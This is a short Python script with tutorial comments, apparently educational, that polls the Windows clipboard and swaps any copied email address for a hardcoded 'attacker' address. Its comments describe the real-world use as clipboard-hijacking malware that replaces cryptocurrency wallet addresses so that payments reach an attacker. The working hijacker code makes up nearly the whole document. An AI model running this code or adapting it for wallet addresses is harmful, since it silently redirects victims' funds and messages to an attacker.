#Inspect/scan the Windows clipboard for emails and modify a copied clipboard email address with alex@secskills.com

##Actual real world application:##
        #clipboard related malware, for people trying to steal bitcoin
        #when send they want to send value over, address is hex values, copies/paste
        #bitcoin or etherem address can be replaced with attacker address instead of recipient.  


# import win32cliboard library, pip install pywin32
# import re for matching regular expressions
# import sleep command from time libary to not run code constantly


import win32clipboard,re
from time import sleep

attacker_email = "alex@secskills.com"
emailregex = '^[a-z0-9]+[\.]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

#infinite loop while true
while True:
    win32clipboard.OpenClipboard()                          #access to clipboard with OpenClipboard()
    data = win32clipboard.GetClipboardData().rstrip()       #stored data , rstrip will remove trailing whitespace
    print(data)  
    if (re.search(emailregex,data)):                        #re.search will let us match with our regular expression defined above.
        win32clipboard.EmptyClipboard();                    #if statement is true if user copied email address to their clipboard
        win32clipboard.SetClipboardText(attacker_email)     #if email is detected attacker email will replace the clipboard text
        break                                               #when successfully changed program will break, if not will close and sleep
    win32clipboard.CloseClipboard()
    sleep(1)


#sleep statement at bottom to not run constantly